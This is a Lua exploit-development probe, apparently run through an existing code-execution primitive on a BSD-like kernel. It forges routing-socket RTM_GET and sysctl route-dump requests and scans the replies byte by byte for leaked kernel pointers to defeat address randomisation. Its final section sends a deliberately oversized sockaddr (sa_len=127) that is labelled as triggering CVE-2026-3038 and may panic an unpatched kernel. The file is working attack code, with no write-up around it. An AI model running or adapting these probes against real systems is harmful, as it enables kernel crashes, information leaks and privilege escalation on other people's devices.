-- CRASH_CLASS: LOW
-- PROBE 56e: Routing socket deep examination — hunt for uninitialized data
--
-- 53b: RTM_GET returned 136 bytes, mostly zeros, qword-aligned scan found nothing.
-- This probe:
-- A. RTM_GET in a loop (10 calls) — check if padding bytes vary between calls
-- B. NET_RT_DUMP via sysctl — get ALL routes, scan every byte
-- C. NET_RT_IFLIST — interface list (different code path from iflistl)
-- D. RTM_GET with different sockaddr families (IPv6, link-layer)
-- E. Examine EVERY byte of responses, not just qword-aligned
-- F. Test sa_len > 16 in RTM_GET request (CVE-2026-3038 safe probe)

print("=== PROBE 56e: ROUTING SOCKET DEEP ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function wb(buf, off, val)
    local cur = rd(N(buf) + (off - off % 4)) or 0
    local shift = (off % 4) * 8
    local mask = 0xFF * (2 ^ shift)
    cur = cur - (cur % (2 ^ (shift + 8))) + (cur % (2 ^ shift))
    cur = cur + val * (2 ^ shift)
    wd(N(buf) + (off - off % 4), cur)
end
local function rb(buf, off)
    local dw = rd(N(buf) + (off - off % 4))
    if not dw then return nil end
    local shift = (off % 4) * 8
    return math.floor(dw / (2 ^ shift)) % 256
end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid end

-- Syscalls
local sc_socket = mk(97)
local sc_write = mk(4)
local sc_read = mk(3)
local sc_close = mk(6)
local sc_sysctl = mk(202)
local sc_recvfrom = mk(29)

-- ============ SECTION A: RTM_GET repeated ============
print("[A] RTM_GET x10 — check padding variation")

local PF_ROUTE = 17
local SOCK_RAW = 3

-- Pack rt_msghdr first dword: msglen(u16 LE) + version(u8) + type(u8)
local function pack_hdr0(msglen, ver, mtype)
    return (msglen % 256) + math.floor(msglen / 256) * 256 + ver * 65536 + mtype * 16777216
end

local function do_rtm_get(seq)
    local fd_ret = sc_socket(uint64(PF_ROUTE), uint64(SOCK_RAW), uint64(0))
    local fd = N(fd_ret)
    if fd < 0 then return nil, "socket=" .. fd end

    -- Build RTM_GET message: rt_msghdr(152 bytes) + sockaddr_in(16 bytes)
    local HDRLEN = 152
    local MSGLEN = HDRLEN + 16
    local msg = memory.alloc(MSGLEN + 16)

    -- Zero the buffer
    for i = 0, MSGLEN - 1, 4 do wd(N(msg) + i, 0) end

    -- rt_msghdr fields
    wd(N(msg) + 0, pack_hdr0(MSGLEN, 5, 4))  -- msglen, version=5, type=4(GET)
    wd(N(msg) + 4, 0)              -- index=0, pad=0
    wd(N(msg) + 8, 0x01)           -- addrs = RTA_DST
    wd(N(msg) + 12, pid)           -- pid
    wd(N(msg) + 16, seq)           -- seq

    -- sockaddr_in for default route (0.0.0.0)
    local sa_off = HDRLEN
    wb(msg, sa_off, 16)       -- sa_len = 16
    wb(msg, sa_off + 1, 2)    -- sa_family = AF_INET
    -- rest zeros = 0.0.0.0

    local wret = sc_write(uint64(fd), uint64(N(msg)), uint64(MSGLEN))

    -- Read response
    local rbuf = memory.alloc(0x1000)
    for i = 0, 0xFFC, 4 do wd(N(rbuf) + i, 0) end

    local rret = sc_read(uint64(fd), uint64(N(rbuf)), uint64(0x1000))
    local rlen = N(rret)

    sc_close(uint64(fd))
    return rbuf, rlen
end

-- Track which bytes are EVER non-zero across all calls
local ever_nonzero = {}
local responses = {}

for i = 1, 10 do
    local rbuf, rlen = do_rtm_get(i)
    if rbuf and type(rlen) == "number" and rlen > 0 then
        local bytes = {}
        for j = 0, math.min(rlen - 1, 255) do
            local b = rb(rbuf, j)
            bytes[j] = b or 0
            if b and b ~= 0 then
                ever_nonzero[j] = (ever_nonzero[j] or 0) + 1
            end
        end
        responses[i] = {len = rlen, bytes = bytes}
        if i == 1 then
            print(string.format("  r1: len=%d", rlen))
        end
    else
        print(string.format("  r%d: FAIL rlen=%s", i, tostring(rlen)))
    end
end

-- Check for varying bytes (different across runs)
local varying = {}
if responses[1] and responses[2] then
    local maxlen = math.min(responses[1].len, responses[2].len, 256)
    for j = 0, maxlen - 1 do
        local vals = {}
        for i = 1, 10 do
            if responses[i] then
                vals[#vals + 1] = responses[i].bytes[j] or 0
            end
        end
        local all_same = true
        for k = 2, #vals do
            if vals[k] ~= vals[1] then all_same = false; break end
        end
        if not all_same then
            varying[#varying + 1] = j
        end
    end
end

if #varying > 0 then
    print("  VARYING bytes across 10 calls:")
    for _, off in ipairs(varying) do
        local vals = {}
        for i = 1, math.min(#responses, 5) do
            if responses[i] then
                vals[#vals + 1] = string.format("%02X", responses[i].bytes[off] or 0)
            end
        end
        print(string.format("    +0x%02X: %s", off, table.concat(vals, " ")))
    end
else
    print("  No varying bytes across 10 RTM_GET calls")
end

-- Full hex dump of first response (up to 256 bytes)
if responses[1] then
    print(string.format("  Hex dump (first %d bytes):", math.min(responses[1].len, 256)))
    local len = math.min(responses[1].len, 256)
    for row = 0, len - 1, 16 do
        local hex = {}
        for j = 0, 15 do
            if row + j < len then
                hex[#hex + 1] = string.format("%02X", responses[1].bytes[row + j] or 0)
            end
        end
        print(string.format("    +%03X: %s", row, table.concat(hex, " ")))
    end
end

-- Scan for kernel-like qwords at ALL alignments (stride 1)
print("  Pointer scan (stride=1):")
local kptrs_found = 0
if responses[1] then
    local b = responses[1].bytes
    local len = math.min(responses[1].len, 256)
    for off = 0, len - 8 do
        -- Build qword from 8 bytes at offset
        local lo = (b[off] or 0) + (b[off+1] or 0) * 256 +
                   (b[off+2] or 0) * 65536 + (b[off+3] or 0) * 16777216
        local hi = (b[off+4] or 0) + (b[off+5] or 0) * 256 +
                   (b[off+6] or 0) * 65536 + (b[off+7] or 0) * 16777216
        if hi >= 0xFFFF8000 and hi ~= 0xFFFFFFFF then
            print(string.format("    *** KERNEL PTR at +0x%02X: 0x%08X%08X ***", off, hi, lo))
            kptrs_found = kptrs_found + 1
        end
    end
end
if kptrs_found == 0 then
    print("    none")
end

-- ============ SECTION B: NET_RT_DUMP via sysctl ============
print("")
print("[B] NET_RT_DUMP via sysctl")

-- MIB: CTL_NET(4), PF_ROUTE(17), 0, 0, NET_RT_DUMP(1), 0
local mib = memory.alloc(24)
wd(N(mib), 4)       -- CTL_NET
wd(N(mib) + 4, 17)  -- PF_ROUTE
wd(N(mib) + 8, 0)   -- protocol
wd(N(mib) + 12, 0)  -- address family (0=all)
wd(N(mib) + 16, 1)  -- NET_RT_DUMP
wd(N(mib) + 20, 0)  -- flags

-- First call: get required size
local oldlenp = memory.alloc(8)
wq(oldlenp, uint64(0))
local ret = sc_sysctl(uint64(N(mib)), uint64(6), uint64(0), uint64(N(oldlenp)), uint64(0), uint64(0))
local need_h, need_l = get_hi_lo(rq(N(oldlenp)))
print(string.format("  size query: ret=%d need=0x%X%08X", N(ret), need_h, need_l))

if N(ret) == 0 and need_l > 0 and need_l < 0x100000 then
    local outbuf = memory.alloc(need_l + 256)
    -- Zero the buffer first
    for i = 0, math.min(need_l + 255, 0xFFFF), 4 do wd(N(outbuf) + i, 0) end

    wq(oldlenp, uint64(need_l + 256))
    ret = sc_sysctl(uint64(N(mib)), uint64(6), uint64(N(outbuf)), uint64(N(oldlenp)), uint64(0), uint64(0))
    local got_h, got_l = get_hi_lo(rq(N(oldlenp)))
    print(string.format("  data query: ret=%d got=%d bytes", N(ret), got_l))

    if N(ret) == 0 and got_l > 0 then
        -- Parse routing messages
        local pos = 0
        local msg_count = 0
        local kptr_total = 0

        while pos < got_l and msg_count < 50 do
            local msglen_lo = rb(outbuf, pos) or 0
            local msglen_hi = rb(outbuf, pos + 1) or 0
            local msglen = msglen_lo + msglen_hi * 256
            if msglen < 4 or pos + msglen > got_l then break end

            local version = rb(outbuf, pos + 2) or 0
            local mtype = rb(outbuf, pos + 3) or 0
            msg_count = msg_count + 1

            -- Scan this message for kernel pointers (stride=1)
            local found_in_msg = 0
            for off = 0, msglen - 8 do
                local b0 = rb(outbuf, pos + off) or 0
                local b1 = rb(outbuf, pos + off + 1) or 0
                local b2 = rb(outbuf, pos + off + 2) or 0
                local b3 = rb(outbuf, pos + off + 3) or 0
                local b4 = rb(outbuf, pos + off + 4) or 0
                local b5 = rb(outbuf, pos + off + 5) or 0
                local b6 = rb(outbuf, pos + off + 6) or 0
                local b7 = rb(outbuf, pos + off + 7) or 0
                local hi = b4 + b5 * 256 + b6 * 65536 + b7 * 16777216
                local lo = b0 + b1 * 256 + b2 * 65536 + b3 * 16777216
                if hi >= 0xFFFF8000 and hi ~= 0xFFFFFFFF then
                    print(string.format("  *** MSG#%d type=%d +0x%02X: KPTR 0x%08X%08X ***",
                        msg_count, mtype, off, hi, lo))
                    found_in_msg = found_in_msg + 1
                    kptr_total = kptr_total + 1
                end
            end

            -- Count non-zero bytes in padding regions
            local nz_count = 0
            for off = 0, msglen - 1 do
                if (rb(outbuf, pos + off) or 0) ~= 0 then
                    nz_count = nz_count + 1
                end
            end

            if msg_count <= 5 or found_in_msg > 0 then
                print(string.format("  msg#%d: type=%d ver=%d len=%d nz_bytes=%d kptrs=%d",
                    msg_count, mtype, version, msglen, nz_count, found_in_msg))
            end

            pos = pos + msglen
        end

        print(string.format("  Total: %d messages, %d kernel pointers", msg_count, kptr_total))
    end
else
    print("  NET_RT_DUMP sysctl failed or size=0")
end

-- ============ SECTION C: NET_RT_FLAGS ============
print("")
print("[C] NET_RT_FLAGS via sysctl")
wd(N(mib) + 16, 2)  -- NET_RT_FLAGS
wd(N(mib) + 20, 0x2) -- RTF_GATEWAY
wq(oldlenp, uint64(0))
ret = sc_sysctl(uint64(N(mib)), uint64(6), uint64(0), uint64(N(oldlenp)), uint64(0), uint64(0))
local fl_h, fl_l = get_hi_lo(rq(N(oldlenp)))
print(string.format("  NET_RT_FLAGS(GATEWAY): ret=%d size=%d", N(ret), fl_l))

-- ============ SECTION D: RTM_GET with IPv6 dest ============
print("")
print("[D] RTM_GET with IPv6 (AF_INET6=28)")

repeat
    local fd_ret = sc_socket(uint64(PF_ROUTE), uint64(SOCK_RAW), uint64(0))
    local fd = N(fd_ret)
    if fd < 0 then print("  socket=" .. fd); break end

    local HDRLEN = 152
    local SA6LEN = 28  -- sizeof(sockaddr_in6)
    local MSGLEN = HDRLEN + SA6LEN
    local msg = memory.alloc(MSGLEN + 16)
    for i = 0, MSGLEN - 1, 4 do wd(N(msg) + i, 0) end

    wd(N(msg) + 0, pack_hdr0(MSGLEN, 5, 4))
    wd(N(msg) + 8, 0x01) -- RTA_DST
    wd(N(msg) + 12, pid)
    wd(N(msg) + 16, 100) -- seq

    wb(msg, HDRLEN, SA6LEN)  -- sa_len
    wb(msg, HDRLEN + 1, 28)  -- sa_family = AF_INET6
    -- ::0 default

    local wret = sc_write(uint64(fd), uint64(N(msg)), uint64(MSGLEN))
    local wlen = N(wret)

    local rbuf = memory.alloc(0x1000)
    for i = 0, 0xFFC, 4 do wd(N(rbuf) + i, 0) end
    local rret = sc_read(uint64(fd), uint64(N(rbuf)), uint64(0x1000))
    local rlen = N(rret)

    print(string.format("  write=%d read=%d", wlen, rlen))

    if rlen > 0 then
        -- Quick kernel pointer scan
        local found = 0
        for off = 0, math.min(rlen, 512) - 8 do
            local lo_dw = rd(N(rbuf) + (off - off % 4)) or 0
            local hi_dw = rd(N(rbuf) + (off - off % 4) + 4) or 0
            -- Approximate: just check at dword alignment for speed
            if off % 4 == 0 then
                if hi_dw >= 0xFFFF8000 and hi_dw ~= 0xFFFFFFFF then
                    print(string.format("    *** KPTR at +0x%02X ***", off))
                    found = found + 1
                end
            end
        end
        if found == 0 then
            print("    No kernel pointers")
        end
    end

    sc_close(uint64(fd))
until true

-- ============ SECTION E: sa_len overflow test (SAFE — oversized but not huge) ============
print("")
print("[E] RTM_GET with sa_len=20 (slightly oversized sockaddr_in)")

repeat
    local fd_ret = sc_socket(uint64(PF_ROUTE), uint64(SOCK_RAW), uint64(0))
    local fd = N(fd_ret)
    if fd < 0 then print("  socket=" .. fd); break end

    local HDRLEN = 152
    local MSGLEN = HDRLEN + 20  -- sa_len=20 instead of normal 16
    local msg = memory.alloc(MSGLEN + 16)
    for i = 0, MSGLEN - 1, 4 do wd(N(msg) + i, 0) end

    wd(N(msg) + 0, pack_hdr0(MSGLEN, 5, 4))
    wd(N(msg) + 8, 0x01)
    wd(N(msg) + 12, pid)
    wd(N(msg) + 16, 200)

    wb(msg, HDRLEN, 20)      -- sa_len = 20 (oversized for AF_INET)
    wb(msg, HDRLEN + 1, 2)   -- AF_INET
    -- 0.0.0.0

    local wret = sc_write(uint64(fd), uint64(N(msg)), uint64(MSGLEN))
    local wlen = N(wret)

    local rbuf = memory.alloc(0x1000)
    for i = 0, 0xFFC, 4 do wd(N(rbuf) + i, 0) end
    local rret = sc_read(uint64(fd), uint64(N(rbuf)), uint64(0x1000))
    local rlen = N(rret)

    print(string.format("  sa_len=20: write=%d read=%d", wlen, rlen))

    if rlen > 0 then
        -- Hex dump header area
        local dlen = math.min(rlen, 200)
        for row = 0, dlen - 1, 16 do
            local hex = {}
            for j = 0, 15 do
                if row + j < dlen then
                    hex[#hex + 1] = string.format("%02X", rb(rbuf, row + j) or 0)
                end
            end
            print(string.format("    +%03X: %s", row, table.concat(hex, " ")))
        end
    end

    sc_close(uint64(fd))
until true

-- ============ SECTION F: sa_len=127 overflow test ============
print("")
print("[F] RTM_GET with sa_len=127 (CVE-2026-3038 max overflow)")
print("  CAUTION: may panic kernel if unpatched")

repeat
    local fd_ret = sc_socket(uint64(PF_ROUTE), uint64(SOCK_RAW), uint64(0))
    local fd = N(fd_ret)
    if fd < 0 then print("  socket=" .. fd); break end

    local HDRLEN = 152
    local SA_LEN = 127
    local MSGLEN = HDRLEN + SA_LEN
    local msg = memory.alloc(MSGLEN + 16)
    for i = 0, MSGLEN - 1, 4 do wd(N(msg) + i, 0) end

    wd(N(msg) + 0, pack_hdr0(MSGLEN, 5, 4))
    wd(N(msg) + 8, 0x01)
    wd(N(msg) + 12, pid)
    wd(N(msg) + 16, 300)

    wb(msg, HDRLEN, SA_LEN)   -- sa_len = 127
    wb(msg, HDRLEN + 1, 2)    -- AF_INET

    local wret = sc_write(uint64(fd), uint64(N(msg)), uint64(MSGLEN))
    local wlen = N(wret)

    -- If kernel is patched, write may return -1 or we get an error response
    -- If kernel is unpatched, kernel panics (we won't get here)
    print(string.format("  sa_len=127: write=%d", wlen))

    if wlen > 0 then
        print("  Write accepted! Trying to read response...")
        local rbuf = memory.alloc(0x1000)
        for i = 0, 0xFFC, 4 do wd(N(rbuf) + i, 0) end
        local rret = sc_read(uint64(fd), uint64(N(rbuf)), uint64(0x1000))
        local rlen = N(rret)
        print(string.format("  read=%d", rlen))

        if rlen > 0 then
            local dlen = math.min(rlen, 320)
            for row = 0, dlen - 1, 16 do
                local hex = {}
                for j = 0, 15 do
                    if row + j < dlen then
                        hex[#hex + 1] = string.format("%02X", rb(rbuf, row + j) or 0)
                    end
                end
                print(string.format("    +%03X: %s", row, table.concat(hex, " ")))
            end

            -- Kernel pointer scan
            for off = 0, math.min(rlen, 320) - 8 do
                if off % 4 == 0 then
                    local hi = rd(N(rbuf) + off + 4) or 0
                    if hi >= 0xFFFF8000 and hi ~= 0xFFFFFFFF then
                        local lo = rd(N(rbuf) + off) or 0
                        print(string.format("    *** KPTR +0x%02X: 0x%08X%08X ***", off, hi, lo))
                    end
                end
            end
        end
    else
        print("  Write rejected (kernel may have validation)")
    end

    sc_close(uint64(fd))
until true

print("")
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 56e COMPLETE ===")
